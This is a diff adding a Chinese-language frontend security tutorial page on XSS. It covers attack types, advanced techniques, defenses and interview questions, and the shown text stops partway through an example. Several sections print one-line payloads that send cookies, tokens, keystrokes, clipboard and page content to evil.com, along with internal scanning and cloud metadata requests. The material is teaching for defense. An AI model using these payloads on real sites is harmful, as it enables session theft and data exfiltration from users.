@@ -1,0 +1,713 @@
+import {
+  Card,
+  Table,
+  Tag,
+  Typography,
+  Alert,
+  Collapse,
+  List,
+  Steps,
+  Tabs,
+} from 'antd';
+import { xssTypes, xssTypeColumns, xssVectors, vectorColumns, defenseMethods, defenseColumns } from './data';
+import CodeBlock from '@/components/CodeBlock';
+import LiveDemo from './LiveDemo';
+import CspLiveDemo from './CspLiveDemo';
+import XssVectorTable from './XssVectorTable';
+
+# XSS 跨站脚本攻击深度解析
+
+> XSS（Cross-Site Scripting）是前端安全领域的「头号公敌」——它**利用的是浏览器对页面脚本的天然信任**。攻击者一旦成功注入，就能以受害者身份执行任意操作。
+
+<Alert
+  message="核心矛盾"
+  description="XSS 的根因是：浏览器无法区分「开发者写的合法脚本」和「攻击者注入的恶意脚本」。一切 XSS 防御本质上都是在帮浏览器做这件事——告诉它哪些代码是可信的。"
+  type="error"
+  showIcon
+  style={{ marginBottom: 24 }}
+/>
+
+---
+
+## 一、攻击类型全景
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Paragraph>
+    XSS 远不止经典的三种分类。下表覆盖<strong>前端工程师应知的 {xssTypes.length} 种 XSS 攻击方式</strong>：
+  </Typography.Paragraph>
+
+  <Table
+    dataSource={xssTypes}
+    columns={xssTypeColumns}
+    pagination={false}
+    size="small"
+    bordered
+    scroll={{ x: 1000 }}
+    rowKey="key"
+    style={{ marginBottom: 16 }}
+  />
+</Card>
+
+---
+
+## 二、经典三种 XSS 详解
+
+<Tabs
+  style={{ marginBottom: 24 }}
+  defaultActiveKey="stored"
+  items={[
+    {
+      key: 'stored',
+      label: '存储型 XSS',
+      children: (
+        <Card>
+          <Typography.Title level={4}>攻击流程</Typography.Title>
+          <Steps
+            size="small"
+            direction="vertical"
+            items={[
+              { title: '第一步：攻击者提交恶意内容', description: '在评论区、用户资料、私信等入口提交包含恶意脚本的内容，如 `<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>`' },
+              { title: '第二步：服务端存储未过滤的内容', description: '服务端将用户输入原样存入数据库——没有做 HTML 实体编码或标签过滤。这是服务端的疏漏，但前端同样可以防御。' },
+              { title: '第三步：受害者访问页面', description: '任何用户访问包含该恶意内容的页面时，服务端将数据库中的原始 HTML 拼接进页面模板返回。' },
+              { title: '第四步：浏览器执行恶意脚本', description: '浏览器解析 HTML 时遇到 `<script>` 标签，将其作为合法脚本执行。攻击者的 JS 在受害者的浏览器中以目标站点的 Origin 运行。' },
+              { title: '第五步：数据外传', description: '脚本将 Cookie、localStorage、页面内容通过 Image/fetch/sendBeacon 发送到攻击者控制的服务器。' },
+            ]}
+          />
+
+          <Typography.Title level={5} style={{ marginTop: 24 }}>代码示例</Typography.Title>
+          <Typography.Paragraph><strong>Bad —— 服务端直接拼接用户输入到 HTML：</strong></Typography.Paragraph>
+          <CodeBlock language="javascript" code={`// Node.js Express - 错误做法
+app.get('/comments', async (req, res) => {
+  const comments = await db.query('SELECT * FROM comments');
+  let html = '<h1>评论列表</h1>';
+  comments.forEach(c => {
+    // 危险！c.content 可能包含 <script> 标签
+    html += '<div class="comment">' + c.content + '</div>';
+  });
+  res.send(html);
+});`} />
+
+          <Typography.Paragraph style={{ marginTop: 16 }}><strong>Good —— 输出时做 HTML 实体编码：</strong></Typography.Paragraph>
+          <CodeBlock language="javascript" code={`// 前端使用 DOMPurify 清理 + 正确使用安全 API
+import DOMPurify from 'dompurify';
+
+// 方案一：DOMPurify 白名单过滤（富文本场景）
+const safeHTML = DOMPurify.sanitize(userInput, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
+  ALLOWED_ATTR: ['href', 'title', 'target'],
+});
+
+// 方案二：纯文本使用 textContent（非 innerHTML）
+document.getElementById('comment').textContent = userInput;
+
+// 方案三：React JSX 自动 HTML 编码
+// ✅ 安全：JSX 默认将 {} 中的值进行 HTML 实体编码
+<div>{userInput}</div>
+
+// ❌ 危险：绕过 React 的默认编码
+<div dangerouslySetInnerHTML={{ __html: userInput }} />`} />
+
+          <Alert
+            message="真实案例：TweetDeck XSS 蠕虫（2014）"
+            description="攻击者发现 TweetDeck 对推文内容未做充分过滤，在推文中嵌入 `<script>` 标签。任何在 TweetDeck 中看到该推文的用户，其浏览器会自动执行该脚本——脚本又自动用该用户的账号发布同样的推文。这就是 XSS 蠕虫（XSS Worm）：自我复制、指数级传播。在不到一小时内影响了超过 10000 个 Twitter 用户。"
+            type="warning"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+    {
+      key: 'reflected',
+      label: '反射型 XSS',
+      children: (
+        <Card>
+          <Typography.Title level={4}>攻击流程</Typography.Title>
+          <Steps
+            size="small"
+            direction="vertical"
+            items={[
+              { title: '第一步：攻击者构造恶意 URL', description: '`https://bank.com/login?error=<script src="https://evil.com/steal.js"></script>`——将恶意脚本嵌入 URL 参数。' },
+              { title: '第二步：社工诱导用户点击', description: '通过钓鱼邮件、短信、IM 发送链接。用户看到域名是 bank.com（可信），降低警惕。' },
+              { title: '第三步：服务端反射参数到响应', description: '服务端将 error 参数的值直接嵌入登录页面的错误提示区：`<div class="error">{{error}}</div>`' },
+              { title: '第四步：浏览器执行脚本', description: '脚本在 bank.com 的 Origin 下执行，可读取该域下的 Cookie 和 localStorage。' },
+            ]}
+          />
+
+          <Typography.Title level={5} style={{ marginTop: 24 }}>核心代码对比</Typography.Title>
+          <CodeBlock language="javascript" code={`// ❌ Bad: 反射型 XSS —— 服务端直接回显查询参数
+// URL: /search?q=<script>alert('xss')</script>
+app.get('/search', (req, res) => {
+  const query = req.query.q;
+  // 危险！直接拼接 HTML
+  res.send(\`<h1>搜索"\${query}"的结果</h1>\`);
+});
+
+// ✅ Good: 输出编码
+import escapeHtml from 'escape-html';
+app.get('/search', (req, res) => {
+  const query = escapeHtml(req.query.q);
+  // 安全：<script> 被编码为 &lt;script&gt;
+  res.send(\`<h1>搜索"\${query}"的结果</h1>\`);
+});`} />
+
+          <Alert
+            message="反射型 XSS 的关键特征"
+            description="需要用户主动点击恶意链接（社工成本），但危害极高——因为在目标域下执行，可窃取该域全部数据。现代浏览器内置 XSS Auditor（Chrome 已移除，Edge 保留）仅能检测最简单的反射型 XSS。"
+            type="info"
+            showIcon
+            style={{ marginTop: 16 }}
+          />
+        </Card>
+      ),
+    },
+    {
+      key: 'dom',
+      label: 'DOM 型 XSS',
+      children: (
+        <Card>
+          <Typography.Title level={4}>最隐蔽的 XSS —— 服务端日志零痕迹</Typography.Title>
+          <Typography.Paragraph>
+            DOM 型 XSS 的整个攻击链都在客户端完成——服务端返回完全正常的 HTML，但前端 JS 在操作 DOM 时引入了恶意代码。这使<strong>它无法被 WAF 和日志审计发现</strong>。
+          </Typography.Paragraph>
+
+          <Typography.Title level={5}>攻击向量（Sink）—— 危险 API 速查</Typography.Title>
+          <List
+            dataSource={[
+              { code: 'element.innerHTML = userInput', danger: '直接 HTML 注入' },
+              { code: 'document.write(userInput)', danger: '在文档写入时同步解析 HTML' },
+              { code: '$("#el").html(userInput)', danger: 'jQuery .html() 等价于 innerHTML' },
+              { code: 'eval(userInput)', danger: '直接执行字符串作为 JS 代码' },
+              { code: 'setTimeout(userInput, 1000)', danger: '字符串参数会被 eval 执行（Node/浏览器行为一致）' },
+              { code: 'new Function(userInput)', danger: '等价于 eval' },
+              { code: 'location.href = userInput', danger: 'javascript: 协议注入' },
+              { code: 'element.setAttribute("href", userInput)', danger: 'javascript: 协议注入' },
+              { code: 'React: dangerouslySetInnerHTML', danger: '绕过 React 安全编码' },
+              { code: 'Vue: v-html', danger: '绕过 Vue 安全编码' },
+            ]}
+            renderItem={(item) => (
+              <List.Item>
+                <Tag color="red">Sink</Tag>{' '}
+                <Typography.Text code>{item.code}</Typography.Text>{' '}— {item.danger}
+              </List.Item>
+            )}
+          />
+
+          <Typography.Title level={5} style={{ marginTop: 24 }}>Source —— 恶意用户输入的来源</Typography.Title>
+          <CodeBlock language="javascript" code={`// 常见 Source（用户可控的数据来源）：
+location.hash        // #<img src=x onerror=alert(1)>
+location.search      // ?name=<script>alert(1)</script>
+location.pathname    // /user/<img src=x onerror=...> (使用 History API 时)
+document.referrer    // 来自恶意页面的 Referer
+postMessage data     // 跨窗口消息中的数据
+localStorage.getItem // 如果之前被 XSS 污染过
+new URLSearchParams  // URL 参数解析
+sessionStorage       // 同 localStorage
+window.name          // 跨域持久化的全局变量`} />
+
+          <Typography.Title level={5} style={{ marginTop: 24 }}>典型攻击链</Typography.Title>
+          <CodeBlock language="javascript" code={`// 看似无害的前端代码
+function showUserName() {
+  // 从 URL hash 读取用户名并显示
+  const name = decodeURIComponent(location.hash.slice(1));
+  document.getElementById('welcome').innerHTML = '欢迎, ' + name + '!';
+}
+// 攻击者构造 URL：
+// https://example.com/welcome#<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>
+// 服务端正常返回页面 → JS 读取 hash → 插入 innerHTML → XSS 触发！
+
+// ✅ 修复方案一：textContent 替代 innerHTML（纯文本场景）
+document.getElementById('welcome').textContent = '欢迎, ' + name + '!';
+
+// ✅ 修复方案二：DOMPurify 清理（必须渲染 HTML 场景）
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(name);
+document.getElementById('welcome').innerHTML = '欢迎, ' + clean + '!';
+
+// ✅ 修复方案三：React/Vue 默认模板语法（自动编码）
+// React: <div>欢迎, {name}!</div>  ← JSX 自动 HTML 编码
+// Vue:   <div>欢迎, {{ name }}!</div>  ← Mustache 自动 HTML 编码
+
+// ❌ 永远不要将用户输入传给：
+// eval() / new Function() / setTimeout(str) / innerHTML / document.write / dangerouslySetInnerHTML / v-html`} />
+        </Card>
+      ),
+    },
+  ]}
+/>
+
+---
+
+## 三、XSS 攻击者能做什么？
+
+当攻击者成功在目标站点 Origin 下执行 JS，他实际上拥有了**和这个页面本身一样的权限**。下面按危害等级分类：
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Title level={4}>🔴 第一级：直接数据窃取</Typography.Title>
+  <Typography.Paragraph><strong>不需要用户交互，脚本执行即刻完成。</strong></Typography.Paragraph>
+  <List
+    dataSource={[
+      {
+        name: 'Cookie 窃取',
+        code: "new Image().src = 'https://evil.com/steal?c=' + document.cookie",
+        detail: '读取所有非 HttpOnly 的 Cookie，包括 Session ID、登录 Token。未设置 HttpOnly 标记的 Cookie 直接用 document.cookie 读取。',
+      },
+      {
+        name: 'localStorage / sessionStorage 窃取',
+        code: "navigator.sendBeacon('https://evil.com/steal', JSON.stringify(localStorage))",
+        detail: 'JWT Token、刷新令牌、用户偏好等全部暴露。localStorage 没有任何 HttpOnly 等效机制保护。',
+      },
+      {
+        name: 'IndexedDB 全量导出',
+        code: "const db = await indexedDB.open('appDB'); db.getAll('users')...",
+        detail: '异步 API，XSS 脚本同样可读取并外传所有数据。不受 HttpOnly、Secure、SameSite 保护。',
+      },
+      {
+        name: '页面 DOM 数据爬取',
+        code: "new Image().src = 'https://evil.com/steal?html=' + encodeURIComponent(document.documentElement.outerHTML)",
+        detail: '读取整个页面——含隐藏的 CSRF Token、用户个人信息、邮箱、手机号、API 响应数据、甚至输入的银行卡号。',
+      },
+      {
+        name: 'OAuth / JWT Token 窃取',
+        code: "fetch('/user/profile').then(r => r.json()).then(d => new Image().src = 'https://evil.com/steal?t=' + d.token)",
+        detail: '发起同源 AJAX 获取 API 返回的 Token 后外传。这是 SPA 中 JWT Token 泄露的主要方式。',
+      },
+      {
+        name: '剪贴板内容窃取',
+        code: "navigator.clipboard.readText().then(t => fetch('https://evil.com/steal?cb=' + t))",
+        detail: '读取用户剪贴板中的验证码、密码、加密货币地址、私钥等。需用户授权但 XSS 成功后可等待时机。',
+      },
+    ]}
+    renderItem={(item) => (
+      <List.Item>
+        <List.Item.Meta
+          title={<Typography.Text strong>{item.name}</Typography.Text>}
+          description={<><Typography.Paragraph>{item.detail}</Typography.Paragraph><CodeBlock code={item.code} language="javascript" /></>}
+        />
+      </List.Item>
+    )}
+  />
+</Card>
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Title level={4}>🟠 第二级：页面操控与钓鱼</Typography.Title>
+  <Typography.Paragraph><strong>攻击者篡改页面，诱导用户执行敏感操作。</strong></Typography.Paragraph>
+  <List
+    dataSource={[
+      {
+        name: '伪造登录框（钓鱼）',
+        code: "document.body.innerHTML = '<div class=\"login-overlay\"><form>...<input name=\"password\">...</form></div>'",
+        detail: '页面顶部覆盖伪装登录表单，诱使用户重新输入密码。因为 URL 是合法目标站点域名，用户极难察觉。',
+      },
+      {
+        name: '表单劫持（Form Grabbing）',
+        code: "document.getElementById('realForm').addEventListener('submit', e => { fetch('https://evil.com/steal', { body: new FormData(e.target) }) })",
+        detail: '不修改页面外观，在现有表单挂载事件监听器。用户正常输入信用卡号、身份证号，提交时数据同时发送给攻击者——完全无感知。',
+      },
+      {
+        name: '转账/操作冒用',
+        code: "fetch('/api/transfer', { method:'POST', credentials:'include', body: JSON.stringify({to:'hacker', amount:10000}) })",
+        detail: '直接以用户身份发起同源 AJAX 执行敏感操作。Cookie 自动携带，CSRF Token 可在页面 DOM 中读取一并带上。<strong>CSRF Token 无法防御 XSS——攻击者在页面内部，所有防御对同源脚本无效。</strong>',
+      },
+      {
+        name: '键盘记录（Keylogger）',
+        code: "document.addEventListener('keydown', e => new Image().src = 'https://evil.com/k?k=' + e.key)",
+        detail: '全局监听键盘事件，记录所有按键——包括密码、验证码、聊天内容。即使密码字段 autocomplete=off 也无法防御。',
+      },
+      {
+        name: '页面重定向',
+        code: "window.location.href = 'https://phishing-site.com/login?r=' + encodeURIComponent(location.href)",
+        detail: '将用户重定向到钓鱼网站。更高级的做法先篡改页面再慢慢诱导操作。',
+      },
+    ]}
+    renderItem={(item) => (
+      <List.Item>
+        <List.Item.Meta
+          title={<Typography.Text strong>{item.name}</Typography.Text>}
+          description={<><Typography.Paragraph>{item.detail}</Typography.Paragraph><CodeBlock code={item.code} language="javascript" /></>}
+        />
+      </List.Item>
+    )}
+  />
+</Card>
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Title level={4}>🟡 第三级：持久化与传播</Typography.Title>
+  <Typography.Paragraph><strong>使攻击在用户离开页面后仍然生效，或自动传播给其他人。</strong></Typography.Paragraph>
+  <List
+    dataSource={[
+      {
+        name: 'Service Worker 注册（存活最长）',
+        code: "navigator.serviceWorker.register('/malicious-sw.js')",
+        detail: '<strong>最危险的持久化手段。</strong>SW 独立于页面生命周期运行，关闭标签页甚至重启浏览器后仍存活。可拦截并篡改页面所有网络请求（含第三方 CDN），在代码加载前注入恶意内容。<em>防御：CSP worker-src 限制 SW 脚本来源。</em>',
+      },
+      {
+        name: 'XSS 蠕虫（自我复制）',
+        code: "fetch('/api/comments', { method:'POST', body: new URLSearchParams({ content: '<script>payload</script>' }) })",
+        detail: '自动以当前用户身份发帖/发私信，内容含同样恶意脚本。其他用户查看时再次执行并继续传播。曾在 TweetDeck、MySpace 等平台大规模爆发，呈指数增长。',
+      },
+      {
+        name: 'localStorage 持久化',
+        code: "localStorage.setItem('infected', true); setInterval(() => { /* 定期检查并重新注入 */ }, 1000)",
+        detail: '在 localStorage 标记已感染状态，setInterval 定期检查。即使页面重新渲染或被部分修复也能立即重新注入，配合 Service Worker 可保持数月。',
+      },
+    ]}
+    renderItem={(item) => (
+      <List.Item>
+        <List.Item.Meta
+          title={<Typography.Text strong>{item.name}</Typography.Text>}
+          description={<><Typography.Paragraph>{item.detail}</Typography.Paragraph><CodeBlock code={item.code} language="javascript" /></>}
+        />
+      </List.Item>
+    )}
+  />
+</Card>
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Title level={4}>🟣 第四级：内网渗透与高级利用</Typography.Title>
+  <Typography.Paragraph><strong>利用受害者在企业内网的访问权限，突破浏览器边界向内网发起攻击。</strong></Typography.Paragraph>
+  <List
+    dataSource={[
+      {
+        name: '内网端口扫描',
+        code: "for (let i = 1; i < 255; i++) { fetch('http://192.168.1.' + i + ':8080', { mode: 'no-cors' }) }",
+        detail: '利用 fetch/img 标签探测内网主机存活和开放端口。通过 onerror/onload 判断主机是否存活。可进一步探测内网服务（Jenkins、K8s Dashboard、Redis 等管理后台）。',
+      },
+      {
+        name: 'SSRF 辅助（云元数据窃取）',
+        code: "fetch('http://169.254.169.254/latest/meta-data/')  // AWS 元数据端点",
+        detail: '云环境中，向云服务商元数据端点（AWS 169.254.169.254、GCE metadata）发起请求，获取 IAM Role 临时凭证——从前端直接打到云端。',
+      },
+      {
+        name: '内网应用 CSRF 链',
+        code: "fetch('http://jenkins.internal:8080/script?script=System.exit(0)')",
+        detail: '以已登录用户浏览器向内网应用发起请求。内网应用安全防护通常较弱、无 CSRF Token、管理后台默认密码。实现从外网到内网的横向移动。',
+      },
+      {
+        name: '加密货币挖矿',
+        code: "const worker = new Worker('miner.js'); worker.postMessage({/* 挖矿配置 */})",
+        detail: '后台 Web Worker 运行挖矿脚本，占用 CPU/GPU 直至浏览器卡顿。可尝试利用 CSP 允许的 CDN 域名加载挖矿脚本绕过策略限制。',
+      },
+    ]}
+    renderItem={(item) => (
+      <List.Item>
+        <List.Item.Meta
+          title={<Typography.Text strong>{item.name}</Typography.Text>}
+          description={<><Typography.Paragraph>{item.detail}</Typography.Paragraph><CodeBlock code={item.code} language="javascript" /></>}
+        />
+      </List.Item>
+    )}
+  />
+</Card>
+
+<Alert
+  message="XSS 攻击能力的核心结论"
+  description="XSS 不是在「页面中弹个 alert」——它是<strong>在目标 Origin 下获得了完整的 JS 执行权限</strong>，可以做这个页面能做的所有事情。因此在设计防御体系时，「XSS 发生后的止损方案」和「防止 XSS 发生」同样重要。HttpOnly、CSP worker-src、SRI、Trusted Types 这些防御手段的价值就在于此——即使 XSS 注入成功，它们也能大幅限制攻击者的破坏范围。"
+  type="error"
+  showIcon
+  style={{ marginBottom: 24 }}
+/>
+
+---
+
+## 四、进阶攻击技术
+
+<Collapse
+  style={{ marginBottom: 24 }}
+  items={[
+    {
+      key: 'mxss',
+      label: <Typography.Text strong>mXSS（突变 XSS）—— 连 DOMPurify 都防不住的攻击</Typography.Text>,
+      children: (
+        <>
+          <Typography.Paragraph>
+            mXSS（Mutation XSS）利用了<strong>浏览器 HTML 解析器的不一致性</strong>。攻击者提交一段经过编码的 HTML（看起来安全），但浏览器的「Parse → Serialize → Parse」过程中，浏览器自动修正不规范 HTML，<strong>导致编码内容被解码</strong>，变为可执行的恶意代码。
+          </Typography.Paragraph>
+
+          <Typography.Title level={5}>关键理解：两套 HTML 解析器</Typography.Title>
+          <List dataSource={['树构建解析器（Tree Construction）—— 解析普通 HTML 文档', '纯文本解析器（Plaintext State）—— 解析 listing、xmp、noscript、style、textarea 等内容时切换到此模式']} renderItem={(item) => <List.Item>• {item}</List.Item>} />
+
+          <Typography.Title level={5}>攻击示例</Typography.Title>
+          <CodeBlock language="html" code={`<!-- 步骤 1: 攻击者提交这段 HTML（看起来是安全的实体编码） -->
+<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
+
+<!-- 步骤 2: DOMPurify 清理后认为安全（实体编码是无害的字符串） -->
+
+<!-- 步骤 3: 浏览器内部的解析过程：
+  a. cursor.innerHTML = '<listing>&lt;img...&gt;</listing>'
+  b. 浏览器切换为 plaintext 解析模式
+  c. 再次序列化 DOM 时实体被解码
+  d. 结果变成: <img src=x onerror=alert(1)>
+  e. img 的 onerror 触发 → XSS 执行！                -->`} />
+
+          <Alert
+            message="mXSS 的严重性"
+            description="这不是 DOMPurify 的 Bug——任何客户端 HTML 清理库都无法 100% 防御 mXSS。因为清理的是字符串，而变异发生在浏览器解析层面。唯一根本解决方案是使用浏览器内置的 Sanitizer API。"
+            type="warning"
+            showIcon
+          />
+        </>
+      ),
+    },
+    {
+      key: 'dom-clobbering-detail',
+      label: <Typography.Text strong>DOM Clobbering —— 不需要 script 标签的 XSS</Typography.Text>,
+      children: (
+        <>
+          <Typography.Paragraph>
+            DOM Clobbering 是一种<strong>不依赖任何代码执行的注入技术</strong>。通过插入合法的 HTML 元素（无需 script、无需事件处理器），利用 HTML 规范中「id/name 属性自动成为 global 属性」的特性，覆盖页面中已有的 JavaScript 变量。
+          </Typography.Paragraph>
+
+          <Typography.Title level={5}>场景一：覆盖全局配置变量</Typography.Title>
+          <CodeBlock language="html" code={`<!-- 攻击者注入（看起来无害） -->
+<a id="config" name="apiUrl" href="https://evil.com/api">
+
+<script>
+  // 开发者以为 config.apiUrl 指向 JS 对象
+  // 但 window.config 已被 HTML 元素覆盖
+  fetch(config.apiUrl + '/user-data')  // → 请求发往 evil.com!
+</script>`} />
+
+          <Typography.Title level={5}>场景二：绕过 CSP nonce</Typography.Title>
+          <CodeBlock language="html" code={`<!-- 合法脚本（有 nonce 保护） -->
+<script nonce="abc123" id="loadScript">
+  var s = document.createElement('script');
+  s.src = '/assets/' + loadScript.getAttribute('data-src');
+  document.body.appendChild(s);
+</script>
+
+<!-- 攻击者注入 HTML 覆盖 loadScript 变量 -->
+<a id="loadScript" data-src="https://evil.com/malware.js">
+<!-- CSP nonce 保护了脚本标签完整性，但 DOM Clobbering 修改了变量引用目标 -->`} />
+
+          <Typography.Title level={5}>场景三：破坏条件判断</Typography.Title>
+          <CodeBlock language="javascript" code={`// HTML 注入: <form id="isAdmin"><input name="checked" value="true">
+// 结果: window.isAdmin 指向 HTMLFormElement（truthy）
+// if (window.isAdmin) { ... }  // 绕过权限检查！
+
+// HTML 注入: <img id="userRole" name="value" value="admin">
+// 结果: window.userRole.value = "admin"
+// if (userRole.value === 'admin') { ... }  // 绕过角色检查`} />
+
+          <Alert
+            message="防御 DOM Clobbering"
+            description="1. 使用严格模式（'use strict'）。2. 用 let/const 局部变量而非依赖 window 全局变量。3. CSP 配置 script-src。4. Trusted Types 确保 DOM 操作类型安全。5. 用户可控 HTML 用 iframe sandbox 隔离。"
+            type="info"
+            showIcon
+          />
+        </>
+      ),
+    },
+    {
+      key: 'css-injection-detail',
+      label: <Typography.Text strong>CSS 注入 —— 用纯 CSS 窃取敏感数据</Typography.Text>,
+      children: (
+        <>
+          <Typography.Paragraph>
+            CSS 不能直接执行 JavaScript，但可通过<strong>属性选择器 + 远程资源加载</strong>逐字符窃取数据。
+          </Typography.Paragraph>
+          <CodeBlock language="css" code={`/* 目标：窃取 input[type="password"] 的 value 属性 */
+/* 攻击者注入这些 CSS 规则（通过 style 标签或 style 属性） */
+
+input[value^="a"] { background: url("https://evil.com/steal?a"); }
+input[value^="b"] { background: url("https://evil.com/steal?b"); }
+input[value^="c"] { background: url("https://evil.com/steal?c"); }
+/* ... 覆盖所有可能字符 ... */
+
+/* 如果 value 以 "p" 开头 → 浏览器请求 evil.com/steal?p */
+/* 攻击者知道第一个字符是 p，注入下一轮：
+input[value^="pa"] { ... }
+input[value^="pb"] { ... }
+以此类推，逐字符窃取完整密码                */`} />
+
+          <Alert
+            message="防御 CSS 注入"
+            description="1. 对用户输入的 CSS 同样过滤。2. CSP 配置 style-src 限制样式来源。3. 使用 nonce 控制内联样式。4. 敏感输入用 autocomplete='off'，避免值出现在可被 CSS 选择器匹配的属性中。"
+            type="info"
+            showIcon
+          />
+        </>
+      ),
+    },
+    {
+      key: 'charset-detail',
+      label: <Typography.Text strong>字符集 XSS —— 编码级别的绕过</Typography.Text>,
+      children: (
+        <>
+          <Typography.Paragraph>
+            浏览器需要猜测页面字符编码时，攻击者利用不同字符集对同一字节序列的不同解读来构造绕过。最经典的是 UTF-7 XSS。
+          </Typography.Paragraph>
+          <CodeBlock language="html" code={`<!-- 原 payload（UTF-8）：<script>alert(1)</script> -->
+<!-- 被服务端过滤（去掉 <script> 标签） -->
+
+<!-- UTF-7 编码绕过：
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+→ 浏览器以 UTF-7 解析时还原为 <script>alert(1)</script>
+
+<!-- 强制 UTF-7 解析：注入 <meta charset="utf-7"> -->
+<!-- 或响应头缺少 charset 配合浏览器自动检测 -->`} />
+          <Alert message="防御" description="1. 响应头明确声明 `Content-Type: text/html; charset=utf-8`。2. HTML 中用 `<meta charset='utf-8'>` 双重保障。3. 始终使用 UTF-8。4. 配置 `X-Content-Type-Options: nosniff` 阻止 MIME 嗅探和字符集自动检测。" type="info" showIcon />
+        </>
+      ),
+    },
+  ]}
+/>
+
+---
+
+## 五、常见 XSS Payload 速查表
+
+<Card style={{ marginBottom: 24 }}>
+  <XssVectorTable />
+</Card>
+
+---
+
+## 六、防御体系：纵深防御
+
+<Card style={{ marginBottom: 24 }}>
+  <Typography.Paragraph>
+    <strong>没有一种防御手段能 100% 防止 XSS。</strong>安全的做法是层层叠加：
+  </Typography.Paragraph>
+
+  <Table
+    dataSource={defenseMethods}
+    columns={defenseColumns}
+    pagination={false}
+    size="small"
+    bordered
+    scroll={{ x: 1000 }}
+    rowKey="key"
+  />
+</Card>
+
+### 防御优先级金字塔
+
+<Steps
+  direction="vertical"
+  size="small"
+  style={{ marginBottom: 24 }}
+  items={[
+    { title: '第一层（最基础）：输出编码', description: 'React JSX `{}`、Vue `{{ }}`、Angular `{{ }}`——现代框架默认就是安全的。永远不要绕过框架的安全机制（dangerouslySetInnerHTML / v-html），除非经过 DOMPurify 清理。' },
+    { title: '第二层：CSP 策略', description: '从 Report-Only 开始部署 CSP，逐步收紧。禁止 unsafe-inline 和 unsafe-eval。使用 nonce 或 hash 处理必要的内联脚本。配置 report-uri 收集违规报告。' },
+    { title: '第三层：Cookie 加固', description: '所有 Session/Token Cookie 必须设置 HttpOnly + Secure + SameSite=Strict（至少 Lax）。使用 __Host- 前缀防止子域 Cookie 覆盖。' },
+    { title: '第四层（终极）：Trusted Types', description: '浏览器级别强制类型安全。CSP 配置 `require-trusted-types-for \'script\'`。通过 DOMPurify 创建 Trusted Types policy 使所有 innerHTML 操作必须经过安全审核。' },
+    { title: '第五层：监控与响应', description: 'CSP report-uri 违规上报 → Sentry/日志 → 安全团队告警 → 第一时间发现 XSS 攻击尝试。回溯 CSP 报告可找出所有被尝试的注入点。' },
+  ]}
+/>
+
+---
+
+## 七、面试高频考点
+
+<Collapse
+  style={{ marginBottom: 24 }}
+  items={[
+    {
+      key: '1',
+      label: 'React / Vue / Angular 如何防 XSS？什么情况绕过框架安全机制？',
+      children: (
+        <>
+          <Typography.Paragraph>
+            <strong>React：</strong>
+            JSX 的插值表达式 <Typography.Text code>{'{userInput}'}</Typography.Text>{' '}
+            默认会进行 HTML 实体编码（例如 <Typography.Text code>{'<script>'}</Typography.Text>{' '}
+            会编码为 <Typography.Text code>{'&lt;script&gt;'}</Typography.Text>）。
+            <br />
+            <strong>绕过方式：</strong>
+            1. <Typography.Text code>dangerouslySetInnerHTML</Typography.Text>；
+            2. 直接操作 DOM：<Typography.Text code>ref.current.innerHTML = userInput</Typography.Text>；
+            3. 链接协议：<Typography.Text code>{'<a href={userInput}>'}</Typography.Text> 中的{' '}
+            <Typography.Text code>javascript:</Typography.Text> 不会被编码。
+            <br /><br />
+            <strong>Vue：</strong>
+            Mustache 语法 <Typography.Text code>{'{{ userInput }}'}</Typography.Text>{' '}
+            默认也会进行 HTML 编码。
+            <br />
+            <strong>绕过方式：</strong>
+            1. <Typography.Text code>v-html</Typography.Text>；
+            2. <Typography.Text code>{'<a :href="userInput">'}</Typography.Text>；
+            3. <Typography.Text code>v-bind:style</Typography.Text> 中的 CSS 注入。
+            <br /><br />
+            <strong>Angular：</strong>
+            模板默认会依据上下文（HTML、Style、URL）做安全处理（Sanitization）。
+            <br />
+            <strong>绕过方式：</strong>
+            1. <Typography.Text code>bypassSecurityTrustHtml()</Typography.Text>；
+            2. <Typography.Text code>bypassSecurityTrustUrl()</Typography.Text>；
+            3. <Typography.Text code>[innerHTML]</Typography.Text> 属性绑定。
+          </Typography.Paragraph>
+        </>
+      ),
+    },
+    {
+      key: '2',
+      label: 'innerHTML vs textContent vs innerText 的安全性对比',
+      children: (
+        <Typography.Paragraph>
+          <strong>innerHTML：</strong>不安全。将字符串解析为 HTML，执行其中 script 和事件处理器。<strong>永远不要将用户输入直接传给 innerHTML。</strong><br />
+          <strong>textContent：</strong>完全安全。将内容作为纯文本设置，所有 HTML 标签当文本显示。不创建 DOM 节点、不触发事件、不执行脚本。<strong>纯文本首选。</strong><br />
+          <strong>innerText：</strong>安全但不推荐。与 textContent 类似但触发 reflow（考虑 CSS、只返回可见文本），性能差。<br /><br />
+          <strong>最佳实践：</strong>纯文本 → textContent；格式内容 → DOMPurify + innerHTML；React/Vue → 默认模板语法。
+        </Typography.Paragraph>
+      ),
+    },
+    {
+      key: '3',
+      label: '富文本编辑器（Quill / TinyMCE / CKEditor）的 XSS 防御方案',
+      children: (
+        <>
+          <Typography.Paragraph>富文本编辑器是 XSS 防御最复杂的场景——必须允许部分 HTML 但不能允许脚本执行。</Typography.Paragraph>
+          <CodeBlock language="javascript" code={`// ── 方案一：DOMPurify 白名单（推荐，最灵活） ──
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(richTextHTML, {
+  ALLOWED_TAGS: ['p','br','b','i','u','s','em','strong','a','img','ul','ol','li','blockquote','h1','h2','h3','code','pre','table','tr','td'],
+  ALLOWED_ATTR: ['href','src','alt','title','target','class'],
+  ALLOW_DATA_ATTR: false,
+  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\\-]+(?:[^a-z+.\\-:]|$))/i,
+});
+
+// ── 方案二：iframe sandbox 隔离（最安全） ──
+<iframe sandbox="allow-scripts" srcdoc={DOMPurify.sanitize(richTextHTML)}
+  style={{ border: 'none', width: '100%', minHeight: 200 }} />
+
+// ── 方案三：Markdown 渲染（最可控） ──
